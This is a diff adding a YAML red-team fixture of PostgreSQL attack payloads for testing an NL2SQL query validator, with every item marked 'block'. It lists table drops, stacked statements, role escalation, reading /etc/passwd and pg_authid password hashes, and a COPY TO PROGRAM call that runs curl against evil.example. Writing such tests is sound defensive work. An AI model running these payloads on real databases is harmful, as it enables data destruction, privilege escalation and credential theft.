@@ -1,0 +1,1747 @@
+# Red-team SQL attack payloads. Every payload must be blocked by validate_sql
+# (expect: block) and is also executed directly against the DB as nl2sql_reader
+# by redteam/run_sql_suite.py to measure what the DB layers stop on their own.
+- id: dml_ddl-001
+  category: dml_ddl
+  expect: block
+  sql: INSERT INTO products (sku, name, category, unit_price) VALUES ('X1','Hacked','x',0)
+- id: dml_ddl-002
+  category: dml_ddl
+  expect: block
+  sql: INSERT INTO customers (name,email,signup_date) SELECT name,email,signup_date FROM customers
+- id: dml_ddl-003
+  category: dml_ddl
+  expect: block
+  sql: UPDATE customers SET tier = 'Gold' WHERE customer_id = 1
+- id: dml_ddl-004
+  category: dml_ddl
+  expect: block
+  sql: UPDATE orders SET total_amount = 0
+- id: dml_ddl-005
+  category: dml_ddl
+  expect: block
+  sql: DELETE FROM orders WHERE status = 'cancelled'
+- id: dml_ddl-006
+  category: dml_ddl
+  expect: block
+  sql: DELETE FROM payments
+- id: dml_ddl-007
+  category: dml_ddl
+  expect: block
+  sql: DROP TABLE customers
+- id: dml_ddl-008
+  category: dml_ddl
+  expect: block
+  sql: DROP TABLE IF EXISTS orders CASCADE
+- id: dml_ddl-009
+  category: dml_ddl
+  expect: block
+  sql: DROP SCHEMA public CASCADE
+- id: dml_ddl-010
+  category: dml_ddl
+  expect: block
+  sql: TRUNCATE TABLE payments
+- id: dml_ddl-011
+  category: dml_ddl
+  expect: block
+  sql: TRUNCATE orders, order_items RESTART IDENTITY CASCADE
+- id: dml_ddl-012
+  category: dml_ddl
+  expect: block
+  sql: ALTER TABLE orders ADD COLUMN pwned int
+- id: dml_ddl-013
+  category: dml_ddl
+  expect: block
+  sql: ALTER TABLE customers DROP COLUMN email
+- id: dml_ddl-014
+  category: dml_ddl
+  expect: block
+  sql: ALTER ROLE nl2sql_reader SUPERUSER
+- id: dml_ddl-015
+  category: dml_ddl
+  expect: block
+  sql: ALTER ROLE nl2sql_reader SET default_transaction_read_only = off
+- id: dml_ddl-016
+  category: dml_ddl
+  expect: block
+  sql: CREATE TABLE pwn (id int)
+- id: dml_ddl-017
+  category: dml_ddl
+  expect: block
+  sql: CREATE TABLE pwn AS SELECT * FROM customers
+- id: dml_ddl-018
+  category: dml_ddl
+  expect: block
+  sql: CREATE TEMP TABLE t AS SELECT * FROM payments
+- id: dml_ddl-019
+  category: dml_ddl
+  expect: block
+  sql: CREATE VIEW v AS SELECT * FROM customers
+- id: dml_ddl-020
+  category: dml_ddl
+  expect: block
+  sql: CREATE OR REPLACE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql
+- id: dml_ddl-021
+  category: dml_ddl
+  expect: block
+  sql: CREATE EXTENSION dblink
+- id: dml_ddl-022
+  category: dml_ddl
+  expect: block
+  sql: CREATE ROLE evil SUPERUSER LOGIN PASSWORD 'x'
+- id: dml_ddl-023
+  category: dml_ddl
+  expect: block
+  sql: CREATE INDEX idx ON orders (status)
+- id: dml_ddl-024
+  category: dml_ddl
+  expect: block
+  sql: CREATE SCHEMA evil
+- id: dml_ddl-025
+  category: dml_ddl
+  expect: block
+  sql: CREATE TRIGGER trg BEFORE INSERT ON orders FOR EACH ROW EXECUTE FUNCTION f()
+- id: dml_ddl-026
+  category: dml_ddl
+  expect: block
+  sql: GRANT ALL PRIVILEGES ON DATABASE nl2sql_assignment TO public
+- id: dml_ddl-027
+  category: dml_ddl
+  expect: block
+  sql: GRANT INSERT ON orders TO nl2sql_reader
+- id: dml_ddl-028
+  category: dml_ddl
+  expect: block
+  sql: REVOKE SELECT ON customers FROM nl2sql_reader
+- id: dml_ddl-029
+  category: dml_ddl
+  expect: block
+  sql: VACUUM orders
+- id: dml_ddl-030
+  category: dml_ddl
+  expect: block
+  sql: VACUUM FULL
+- id: dml_ddl-031
+  category: dml_ddl
+  expect: block
+  sql: REINDEX TABLE orders
+- id: dml_ddl-032
+  category: dml_ddl
+  expect: block
+  sql: CLUSTER orders USING orders_pkey
+- id: dml_ddl-033
+  category: dml_ddl
+  expect: block
+  sql: COMMENT ON TABLE orders IS 'pwned'
+- id: dml_ddl-034
+  category: dml_ddl
+  expect: block
+  sql: REFRESH MATERIALIZED VIEW mv
+- id: dml_ddl-035
+  category: dml_ddl
+  expect: block
+  sql: MERGE INTO orders o USING customers c ON o.customer_id = c.customer_id WHEN MATCHED THEN DELETE
+- id: dml_ddl-036
+  category: dml_ddl
+  expect: block
+  sql: ALTER SYSTEM SET log_statement = 'all'
+- id: dml_ddl-037
+  category: dml_ddl
+  expect: block
+  sql: ALTER DATABASE nl2sql_assignment SET search_path = evil
+- id: dml_ddl-038
+  category: dml_ddl
+  expect: block
+  sql: DROP ROLE nl2sql_reader
+- id: dml_ddl-039
+  category: dml_ddl
+  expect: block
+  sql: ALTER TABLE orders OWNER TO nl2sql_reader
+- id: dml_ddl-040
+  category: dml_ddl
+  expect: block
+  sql: CREATE TABLE t (id int); INSERT INTO t VALUES (1)
+- id: dml_cte-001
+  category: dml_cte
+  expect: block
+  sql: WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d
+- id: dml_cte-002
+  category: dml_cte
+  expect: block
+  sql: WITH d AS (DELETE FROM payments WHERE status='failed' RETURNING payment_id) SELECT count(*) FROM d
+- id: dml_cte-003
+  category: dml_cte
+  expect: block
+  sql: WITH i AS (INSERT INTO agents (name, team) VALUES ('x','y') RETURNING *) SELECT * FROM i
+- id: dml_cte-004
+  category: dml_cte
+  expect: block
+  sql: WITH u AS (UPDATE customers SET tier='Gold' RETURNING customer_id) SELECT count(*) FROM u
+- id: dml_cte-005
+  category: dml_cte
+  expect: block
+  sql: WITH a AS (SELECT 1), d AS (DELETE FROM refunds RETURNING 1) SELECT * FROM a, d
+- id: dml_cte-006
+  category: dml_cte
+  expect: block
+  sql: WITH s AS (SELECT * FROM customers) INSERT INTO customers SELECT * FROM s
+- id: dml_cte-007
+  category: dml_cte
+  expect: block
+  sql: WITH s AS (SELECT customer_id FROM customers) DELETE FROM orders WHERE customer_id IN (SELECT customer_id FROM s)
+- id: dml_cte-008
+  category: dml_cte
+  expect: block
+  sql: WITH s AS (SELECT 1 AS n) UPDATE products SET unit_price = 0 FROM s
+- id: dml_cte-009
+  category: dml_cte
+  expect: block
+  sql: WITH RECURSIVE r AS (SELECT 1 AS n UNION ALL SELECT n+1 FROM r WHERE n<3), d AS (DELETE FROM order_items RETURNING 1) SELECT count(*) FROM d
+- id: dml_cte-010
+  category: dml_cte
+  expect: block
+  sql: WITH x AS (INSERT INTO support_tickets (customer_id, created_date, category, status) VALUES (1, now(), 'other', 'open') RETURNING ticket_id) SELECT * FROM x
+- id: dml_cte-011
+  category: dml_cte
+  expect: block
+  sql: WITH x AS MATERIALIZED (DELETE FROM customers RETURNING *) SELECT * FROM x
+- id: dml_cte-012
+  category: dml_cte
+  expect: block
+  sql: WITH x AS (SELECT 1) MERGE INTO orders o USING x ON true WHEN MATCHED THEN DELETE
+- id: dml_cte-013
+  category: dml_cte
+  expect: block
+  sql: SELECT * FROM (WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d) q
+- id: dml_cte-014
+  category: dml_cte
+  expect: block
+  sql: WITH d AS (DELETE FROM orders RETURNING *) INSERT INTO products (sku,name,category,unit_price) SELECT 'a','b','c',1 FROM d
+- id: stacked_statements-001
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; DROP TABLE orders
+- id: stacked_statements-002
+  category: stacked_statements
+  expect: block
+  sql: SELECT * FROM customers; DELETE FROM orders
+- id: stacked_statements-003
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1;; DROP TABLE orders
+- id: stacked_statements-004
+  category: stacked_statements
+  expect: block
+  sql: "SELECT 1 --\n; DELETE FROM orders"
+- id: stacked_statements-005
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1 /* ; */; DELETE FROM orders
+- id: stacked_statements-006
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1 /* x */ ; /* y */ UPDATE customers SET tier='Gold'
+- id: stacked_statements-007
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1 /* /* nested */ */; DROP TABLE orders
+- id: stacked_statements-008
+  category: stacked_statements
+  expect: block
+  sql: SELECT 'a\'; DROP TABLE orders; --'
+- id: stacked_statements-009
+  category: stacked_statements
+  expect: block
+  sql: SELECT '\'; DELETE FROM orders; --'
+- id: stacked_statements-010
+  category: stacked_statements
+  expect: block
+  sql: SELECT $$x$$; DROP TABLE orders
+- id: stacked_statements-011
+  category: stacked_statements
+  expect: block
+  sql: SELECT $a$ ; $a$; UPDATE customers SET tier='Gold'
+- id: stacked_statements-012
+  category: stacked_statements
+  expect: block
+  sql: SELECT $tag$body$tag$; DELETE FROM payments
+- id: stacked_statements-013
+  category: stacked_statements
+  expect: block
+  sql: SELECT U&'\0027'; DELETE FROM orders
+- id: stacked_statements-014
+  category: stacked_statements
+  expect: block
+  sql: SELECT U&'a!0027b' UESCAPE '!'; DROP TABLE orders
+- id: stacked_statements-015
+  category: stacked_statements
+  expect: block
+  sql: SELECT U&'\+000041'; TRUNCATE orders
+- id: stacked_statements-016
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; COMMIT; DELETE FROM orders
+- id: stacked_statements-017
+  category: stacked_statements
+  expect: block
+  sql: COMMIT; DROP TABLE orders
+- id: stacked_statements-018
+  category: stacked_statements
+  expect: block
+  sql: ROLLBACK; DELETE FROM orders
+- id: stacked_statements-019
+  category: stacked_statements
+  expect: block
+  sql: END; DELETE FROM orders
+- id: stacked_statements-020
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; BEGIN READ WRITE; DELETE FROM orders
+- id: stacked_statements-021
+  category: stacked_statements
+  expect: block
+  sql: BEGIN READ WRITE; DELETE FROM orders; COMMIT
+- id: stacked_statements-022
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; SET default_transaction_read_only = off; DELETE FROM orders
+- id: stacked_statements-023
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; SELECT pg_sleep(5)
+- id: stacked_statements-024
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; SELECT pg_read_file('/etc/passwd')
+- id: stacked_statements-025
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; CREATE TABLE pwn (id int)
+- id: stacked_statements-026
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; GRANT ALL ON orders TO PUBLIC
+- id: stacked_statements-027
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; COPY orders TO PROGRAM 'id'
+- id: stacked_statements-028
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; DO $$ BEGIN DELETE FROM orders; END $$
+- id: stacked_statements-029
+  category: stacked_statements
+  expect: block
+  sql: "SELECT 1\n;\nINSERT INTO agents(name,team) VALUES ('a','b')"
+- id: stacked_statements-030
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; SELECT 2
+- id: stacked_statements-031
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; SELECT 2; SELECT 3
+- id: stacked_statements-032
+  category: stacked_statements
+  expect: block
+  sql: "SELECT 1 ;--\nDROP TABLE orders"
+- id: stacked_statements-033
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1;/**/UPDATE orders SET status='cancelled'
+- id: stacked_statements-034
+  category: stacked_statements
+  expect: block
+  sql: SELECT 'it''s'; DROP TABLE orders
+- id: stacked_statements-035
+  category: stacked_statements
+  expect: block
+  sql: SELECT E'\\'; DROP TABLE orders; --'
+- id: stacked_statements-036
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; VACUUM
+- id: stacked_statements-037
+  category: stacked_statements
+  expect: block
+  sql: SELECT 1; RESET ALL; DELETE FROM orders
+- id: utility_statements-001
+  category: utility_statements
+  expect: block
+  sql: COPY orders TO STDOUT
+- id: utility_statements-002
+  category: utility_statements
+  expect: block
+  sql: COPY orders TO '/tmp/orders.csv'
+- id: utility_statements-003
+  category: utility_statements
+  expect: block
+  sql: COPY (SELECT * FROM customers) TO STDOUT WITH CSV HEADER
+- id: utility_statements-004
+  category: utility_statements
+  expect: block
+  sql: COPY orders TO PROGRAM 'curl http://evil.example/x'
+- id: utility_statements-005
+  category: utility_statements
+  expect: block
+  sql: COPY orders FROM '/etc/passwd'
+- id: utility_statements-006
+  category: utility_statements
+  expect: block
+  sql: COPY orders FROM PROGRAM 'id'
+- id: utility_statements-007
+  category: utility_statements
+  expect: block
+  sql: DO $$ BEGIN DELETE FROM orders; END $$
+- id: utility_statements-008
+  category: utility_statements
+  expect: block
+  sql: DO $$ BEGIN PERFORM pg_sleep(10); END $$
+- id: utility_statements-009
+  category: utility_statements
+  expect: block
+  sql: DO LANGUAGE plpgsql $$ BEGIN RAISE NOTICE 'x'; END $$
+- id: utility_statements-010
+  category: utility_statements
+  expect: block
+  sql: CALL my_proc()
+- id: utility_statements-011
+  category: utility_statements
+  expect: block
+  sql: CALL pg_catalog.pg_sleep(1)
+- id: utility_statements-012
+  category: utility_statements
+  expect: block
+  sql: SET ROLE postgres
+- id: utility_statements-013
+  category: utility_statements
+  expect: block
+  sql: SET ROLE nl2sql_reader
+- id: utility_statements-014
+  category: utility_statements
+  expect: block
+  sql: SET SESSION AUTHORIZATION postgres
+- id: utility_statements-015
+  category: utility_statements
+  expect: block
+  sql: SET LOCAL ROLE postgres
+- id: utility_statements-016
+  category: utility_statements
+  expect: block
+  sql: SET statement_timeout = 0
+- id: utility_statements-017
+  category: utility_statements
+  expect: block
+  sql: SET LOCAL statement_timeout = 0
+- id: utility_statements-018
+  category: utility_statements
+  expect: block
+  sql: SET default_transaction_read_only = off
+- id: utility_statements-019
+  category: utility_statements
+  expect: block
+  sql: SET search_path TO pg_catalog
+- id: utility_statements-020
+  category: utility_statements
+  expect: block
+  sql: SET TRANSACTION READ WRITE
+- id: utility_statements-021
+  category: utility_statements
+  expect: block
+  sql: SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE
+- id: utility_statements-022
+  category: utility_statements
+  expect: block
+  sql: RESET ALL
+- id: utility_statements-023
+  category: utility_statements
+  expect: block
+  sql: RESET ROLE
+- id: utility_statements-024
+  category: utility_statements
+  expect: block
+  sql: RESET statement_timeout
+- id: utility_statements-025
+  category: utility_statements
+  expect: block
+  sql: LOCK TABLE orders IN ACCESS EXCLUSIVE MODE
+- id: utility_statements-026
+  category: utility_statements
+  expect: block
+  sql: LOCK orders
+- id: utility_statements-027
+  category: utility_statements
+  expect: block
+  sql: NOTIFY chan, 'payload'
+- id: utility_statements-028
+  category: utility_statements
+  expect: block
+  sql: LISTEN chan
+- id: utility_statements-029
+  category: utility_statements
+  expect: block
+  sql: UNLISTEN *
+- id: utility_statements-030
+  category: utility_statements
+  expect: block
+  sql: PREPARE p AS DELETE FROM orders
+- id: utility_statements-031
+  category: utility_statements
+  expect: block
+  sql: PREPARE p AS SELECT 1
+- id: utility_statements-032
+  category: utility_statements
+  expect: block
+  sql: EXECUTE p
+- id: utility_statements-033
+  category: utility_statements
+  expect: block
+  sql: DEALLOCATE ALL
+- id: utility_statements-034
+  category: utility_statements
+  expect: block
+  sql: DISCARD ALL
+- id: utility_statements-035
+  category: utility_statements
+  expect: block
+  sql: SHOW ALL
+- id: utility_statements-036
+  category: utility_statements
+  expect: block
+  sql: SHOW data_directory
+- id: utility_statements-037
+  category: utility_statements
+  expect: block
+  sql: SHOW server_version
+- id: utility_statements-038
+  category: utility_statements
+  expect: block
+  sql: BEGIN
+- id: utility_statements-039
+  category: utility_statements
+  expect: block
+  sql: COMMIT
+- id: utility_statements-040
+  category: utility_statements
+  expect: block
+  sql: START TRANSACTION READ WRITE
+- id: utility_statements-041
+  category: utility_statements
+  expect: block
+  sql: SAVEPOINT s1
+- id: utility_statements-042
+  category: utility_statements
+  expect: block
+  sql: DECLARE c CURSOR FOR SELECT * FROM customers
+- id: utility_statements-043
+  category: utility_statements
+  expect: block
+  sql: FETCH ALL FROM c
+- id: utility_statements-044
+  category: utility_statements
+  expect: block
+  sql: CHECKPOINT
+- id: utility_statements-045
+  category: utility_statements
+  expect: block
+  sql: LOAD 'auto_explain'
+- id: utility_statements-046
+  category: utility_statements
+  expect: block
+  sql: ANALYZE orders
+- id: utility_statements-047
+  category: utility_statements
+  expect: block
+  sql: EXPLAIN SELECT * FROM orders
+- id: utility_statements-048
+  category: utility_statements
+  expect: block
+  sql: SECURITY LABEL ON TABLE orders IS 'x'
+- id: utility_statements-049
+  category: utility_statements
+  expect: block
+  sql: IMPORT FOREIGN SCHEMA public FROM SERVER s INTO public
+- id: utility_statements-050
+  category: utility_statements
+  expect: block
+  sql: ABORT
+- id: explain_analyze-001
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN ANALYZE DELETE FROM orders
+- id: explain_analyze-002
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN (ANALYZE) DELETE FROM orders
+- id: explain_analyze-003
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN (ANALYZE, BUFFERS) UPDATE customers SET tier='Gold'
+- id: explain_analyze-004
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN ANALYZE INSERT INTO agents(name,team) VALUES ('a','b')
+- id: explain_analyze-005
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN ANALYZE WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d
+- id: explain_analyze-006
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN ANALYZE SELECT pg_sleep(5)
+- id: explain_analyze-007
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN ANALYZE SELECT * FROM orders
+- id: explain_analyze-008
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN (ANALYZE true, FORMAT JSON) DELETE FROM payments
+- id: explain_analyze-009
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN ANALYZE VERBOSE DELETE FROM refunds
+- id: explain_analyze-010
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN ANALYZE CREATE TABLE t AS SELECT 1
+- id: explain_analyze-011
+  category: explain_analyze
+  expect: block
+  sql: EXPLAIN ANALYZE SELECT query_to_xml('delete from orders', true, true, '')
+- id: locking_and_into-001
+  category: locking_and_into
+  expect: block
+  sql: SELECT * FROM orders FOR UPDATE
+- id: locking_and_into-002
+  category: locking_and_into
+  expect: block
+  sql: SELECT * FROM orders FOR SHARE
+- id: locking_and_into-003
+  category: locking_and_into
+  expect: block
+  sql: SELECT * FROM orders FOR NO KEY UPDATE
+- id: locking_and_into-004
+  category: locking_and_into
+  expect: block
+  sql: SELECT * FROM orders FOR KEY SHARE
+- id: locking_and_into-005
+  category: locking_and_into
+  expect: block
+  sql: SELECT * FROM orders FOR UPDATE NOWAIT
+- id: locking_and_into-006
+  category: locking_and_into
+  expect: block
+  sql: SELECT * FROM orders FOR UPDATE SKIP LOCKED
+- id: locking_and_into-007
+  category: locking_and_into
+  expect: block
+  sql: SELECT * FROM orders o JOIN customers c USING (customer_id) FOR UPDATE OF o
+- id: locking_and_into-008
+  category: locking_and_into
+  expect: block
+  sql: SELECT * FROM (SELECT * FROM orders FOR UPDATE) q
+- id: locking_and_into-009
+  category: locking_and_into
+  expect: block
+  sql: WITH x AS (SELECT * FROM orders FOR UPDATE) SELECT * FROM x
+- id: locking_and_into-010
+  category: locking_and_into
+  expect: block
+  sql: SELECT * INTO newtable FROM orders
+- id: locking_and_into-011
+  category: locking_and_into
+  expect: block
+  sql: SELECT * INTO TEMP TABLE tmp FROM customers
+- id: locking_and_into-012
+  category: locking_and_into
+  expect: block
+  sql: SELECT * INTO UNLOGGED t FROM payments
+- id: locking_and_into-013
+  category: locking_and_into
+  expect: block
+  sql: SELECT order_id INTO pwn FROM orders WHERE status='placed'
+- id: locking_and_into-014
+  category: locking_and_into
+  expect: block
+  sql: SELECT 1 INTO pwn
+- id: string_sql_executors-001
+  category: string_sql_executors
+  expect: block
+  sql: SELECT query_to_xml('select * from pg_catalog.pg_roles', true, true, '')
+- id: string_sql_executors-002
+  category: string_sql_executors
+  expect: block
+  sql: SELECT query_to_xml('select * from customers', true, true, '')
+- id: string_sql_executors-003
+  category: string_sql_executors
+  expect: block
+  sql: SELECT QUERY_TO_XML('select rolname from pg_roles', false, false, '')
+- id: string_sql_executors-004
+  category: string_sql_executors
+  expect: block
+  sql: SELECT pg_catalog.query_to_xml('select * from pg_shadow', true, true, '')
+- id: string_sql_executors-005
+  category: string_sql_executors
+  expect: block
+  sql: SELECT query_to_xml_and_xmlschema('select * from pg_authid', true, true, '')
+- id: string_sql_executors-006
+  category: string_sql_executors
+  expect: block
+  sql: SELECT query_to_xmlschema('select * from pg_roles', true, true, '')
+- id: string_sql_executors-007
+  category: string_sql_executors
+  expect: block
+  sql: SELECT cursor_to_xml('c'::refcursor, 5, true, true, '')
+- id: string_sql_executors-008
+  category: string_sql_executors
+  expect: block
+  sql: SELECT cursor_to_xmlschema('c'::refcursor, true, true, '')
+- id: string_sql_executors-009
+  category: string_sql_executors
+  expect: block
+  sql: SELECT table_to_xml('pg_roles'::regclass, true, true, '')
+- id: string_sql_executors-010
+  category: string_sql_executors
+  expect: block
+  sql: SELECT table_to_xml_and_xmlschema('customers', true, true, '')
+- id: string_sql_executors-011
+  category: string_sql_executors
+  expect: block
+  sql: SELECT schema_to_xml('pg_catalog', true, true, '')
+- id: string_sql_executors-012
+  category: string_sql_executors
+  expect: block
+  sql: SELECT schema_to_xml('public', true, true, '')
+- id: string_sql_executors-013
+  category: string_sql_executors
+  expect: block
+  sql: SELECT database_to_xml(true, true, '')
+- id: string_sql_executors-014
+  category: string_sql_executors
+  expect: block
+  sql: SELECT xpath('/row/rolname/text()', query_to_xml('select rolname from pg_roles', true, false, ''))
+- id: string_sql_executors-015
+  category: string_sql_executors
+  expect: block
+  sql: SELECT (xpath('//row/rolpassword/text()', query_to_xml('select rolpassword from pg_authid', true, false, '')))[1]::text
+- id: string_sql_executors-016
+  category: string_sql_executors
+  expect: block
+  sql: SELECT unnest(xpath('/table/row/*', query_to_xml('select * from pg_settings', true, false, '')))
+- id: string_sql_executors-017
+  category: string_sql_executors
+  expect: block
+  sql: SELECT * FROM xpath_table('key','xml','t','/a','true') AS t(a text)
+- id: string_sql_executors-018
+  category: string_sql_executors
+  expect: block
+  sql: SELECT ts_stat('select to_tsvector(name) from products')
+- id: string_sql_executors-019
+  category: string_sql_executors
+  expect: block
+  sql: SELECT * FROM ts_stat('select to_tsvector(rolname) from pg_roles')
+- id: string_sql_executors-020
+  category: string_sql_executors
+  expect: block
+  sql: SELECT * FROM query_to_xml('select 1', true, true, '')
+- id: string_sql_executors-021
+  category: string_sql_executors
+  expect: block
+  sql: SELECT crosstab('select 1,2,3')
+- id: string_sql_executors-022
+  category: string_sql_executors
+  expect: block
+  sql: SELECT * FROM crosstab('select name, city, tier from customers') AS ct(a text, b text, c text)
+- id: string_sql_executors-023
+  category: string_sql_executors
+  expect: block
+  sql: SELECT pg_catalog.query_to_xml(sql, true, true, '') FROM (SELECT 'select 1' AS sql) q
+- id: string_sql_executors-024
+  category: string_sql_executors
+  expect: block
+  sql: SELECT query_to_xml(format('select * from %I', 'pg_roles'), true, true, '')
+- id: string_sql_executors-025
+  category: string_sql_executors
+  expect: block
+  sql: SELECT query_to_xml(chr(115)||'elect * from pg_roles', true, true, '')
+- id: large_objects-001
+  category: large_objects
+  expect: block
+  sql: SELECT lo_import('/etc/passwd')
+- id: large_objects-002
+  category: large_objects
+  expect: block
+  sql: SELECT lo_export(999999, '/tmp/x')
+- id: large_objects-003
+  category: large_objects
+  expect: block
+  sql: SELECT lo_from_bytea(0, 'x')
+- id: large_objects-004
+  category: large_objects
+  expect: block
+  sql: SELECT lo_from_bytea(0, '\x41'::bytea)
+- id: large_objects-005
+  category: large_objects
+  expect: block
+  sql: SELECT lo_create(0)
+- id: large_objects-006
+  category: large_objects
+  expect: block
+  sql: SELECT lo_creat(-1)
+- id: large_objects-007
+  category: large_objects
+  expect: block
+  sql: SELECT lo_unlink(999999)
+- id: large_objects-008
+  category: large_objects
+  expect: block
+  sql: SELECT lo_get(999999)
+- id: large_objects-009
+  category: large_objects
+  expect: block
+  sql: SELECT lo_put(999999, 0, 'x')
+- id: large_objects-010
+  category: large_objects
+  expect: block
+  sql: SELECT lo_open(999999, 131072)
+- id: large_objects-011
+  category: large_objects
+  expect: block
+  sql: SELECT loread(0, 10)
+- id: large_objects-012
+  category: large_objects
+  expect: block
+  sql: SELECT lowrite(0, 'x')
+- id: large_objects-013
+  category: large_objects
+  expect: block
+  sql: SELECT lo_truncate(0, 0)
+- id: large_objects-014
+  category: large_objects
+  expect: block
+  sql: SELECT lo_lseek(0, 0, 0)
+- id: large_objects-015
+  category: large_objects
+  expect: block
+  sql: SELECT lo_tell(0)
+- id: large_objects-016
+  category: large_objects
+  expect: block
+  sql: SELECT pg_catalog.lo_import('/etc/hosts')
+- id: large_objects-017
+  category: large_objects
+  expect: block
+  sql: SELECT * FROM pg_largeobject
+- id: dblink_fdw-001
+  category: dblink_fdw
+  expect: block
+  sql: SELECT * FROM dblink('host=localhost dbname=postgres', 'select 1') AS t(x int)
+- id: dblink_fdw-002
+  category: dblink_fdw
+  expect: block
+  sql: SELECT dblink_exec('host=localhost dbname=nl2sql_assignment user=postgres', 'delete from orders')
+- id: dblink_fdw-003
+  category: dblink_fdw
+  expect: block
+  sql: SELECT dblink_connect('host=localhost user=postgres')
+- id: dblink_fdw-004
+  category: dblink_fdw
+  expect: block
+  sql: SELECT dblink_connect_u('c', 'host=localhost user=postgres')
+- id: dblink_fdw-005
+  category: dblink_fdw
+  expect: block
+  sql: SELECT dblink_send_query('c', 'delete from orders')
+- id: dblink_fdw-006
+  category: dblink_fdw
+  expect: block
+  sql: SELECT dblink_open('c', 'cur', 'select 1')
+- id: dblink_fdw-007
+  category: dblink_fdw
+  expect: block
+  sql: SELECT * FROM dblink('dbname=postgres', 'select rolpassword from pg_authid') AS t(p text)
+- id: dblink_fdw-008
+  category: dblink_fdw
+  expect: block
+  sql: SELECT postgres_fdw_handler()
+- id: dblink_fdw-009
+  category: dblink_fdw
+  expect: block
+  sql: SELECT file_fdw_handler()
+- id: file_access-001
+  category: file_access
+  expect: block
+  sql: SELECT pg_read_file('/etc/passwd')
+- id: file_access-002
+  category: file_access
+  expect: block
+  sql: SELECT pg_read_file('/etc/passwd', 0, 100)
+- id: file_access-003
+  category: file_access
+  expect: block
+  sql: SELECT pg_read_binary_file('/etc/passwd')
+- id: file_access-004
+  category: file_access
+  expect: block
+  sql: SELECT pg_ls_dir('.')
+- id: file_access-005
+  category: file_access
+  expect: block
+  sql: SELECT * FROM pg_ls_dir('/')
+- id: file_access-006
+  category: file_access
+  expect: block
+  sql: SELECT pg_ls_logdir()
+- id: file_access-007
+  category: file_access
+  expect: block
+  sql: SELECT * FROM pg_ls_logdir()
+- id: file_access-008
+  category: file_access
+  expect: block
+  sql: SELECT * FROM pg_ls_waldir()
+- id: file_access-009
+  category: file_access
+  expect: block
+  sql: SELECT * FROM pg_ls_tmpdir()
+- id: file_access-010
+  category: file_access
+  expect: block
+  sql: SELECT * FROM pg_ls_archive_statusdir()
+- id: file_access-011
+  category: file_access
+  expect: block
+  sql: SELECT * FROM pg_ls_logicalmapdir()
+- id: file_access-012
+  category: file_access
+  expect: block
+  sql: SELECT pg_stat_file('/etc/passwd')
+- id: file_access-013
+  category: file_access
+  expect: block
+  sql: SELECT (pg_stat_file('base')).size
+- id: file_access-014
+  category: file_access
+  expect: block
+  sql: SELECT pg_catalog.pg_read_file('postgresql.conf')
+- id: file_access-015
+  category: file_access
+  expect: block
+  sql: SELECT pg_relation_filepath('orders')
+- id: file_access-016
+  category: file_access
+  expect: block
+  sql: SELECT pg_read_file(setting || '/pg_hba.conf') FROM pg_settings WHERE name = 'data_directory'
+- id: config_functions-001
+  category: config_functions
+  expect: block
+  sql: SELECT set_config('role', 'postgres', false)
+- id: config_functions-002
+  category: config_functions
+  expect: block
+  sql: SELECT set_config('statement_timeout', '0', true)
+- id: config_functions-003
+  category: config_functions
+  expect: block
+  sql: SELECT set_config('default_transaction_read_only', 'off', false)
+- id: config_functions-004
+  category: config_functions
+  expect: block
+  sql: SELECT set_config('search_path', 'pg_catalog', false)
+- id: config_functions-005
+  category: config_functions
+  expect: block
+  sql: SELECT SET_CONFIG('log_statement', 'all', false)
+- id: config_functions-006
+  category: config_functions
+  expect: block
+  sql: SELECT current_setting('data_directory')
+- id: config_functions-007
+  category: config_functions
+  expect: block
+  sql: SELECT current_setting('is_superuser')
+- id: config_functions-008
+  category: config_functions
+  expect: block
+  sql: SELECT current_setting('server_version')
+- id: config_functions-009
+  category: config_functions
+  expect: block
+  sql: SELECT current_setting('hba_file')
+- id: config_functions-010
+  category: config_functions
+  expect: block
+  sql: SELECT current_setting('missing', true)
+- id: config_functions-011
+  category: config_functions
+  expect: block
+  sql: SELECT pg_catalog.current_setting('config_file')
+- id: config_functions-012
+  category: config_functions
+  expect: block
+  sql: SELECT * FROM pg_show_all_settings()
+- id: config_functions-013
+  category: config_functions
+  expect: block
+  sql: SELECT * FROM pg_settings
+- id: config_functions-014
+  category: config_functions
+  expect: block
+  sql: SELECT * FROM pg_file_settings
+- id: config_functions-015
+  category: config_functions
+  expect: block
+  sql: SELECT * FROM pg_hba_file_rules
+- id: config_functions-016
+  category: config_functions
+  expect: block
+  sql: SELECT * FROM orders WHERE current_setting('role') = 'x'
+- id: sleep_locks_resources-001
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_sleep(10)
+- id: sleep_locks_resources-002
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_sleep(0.1)
+- id: sleep_locks_resources-003
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_catalog.pg_sleep(5)
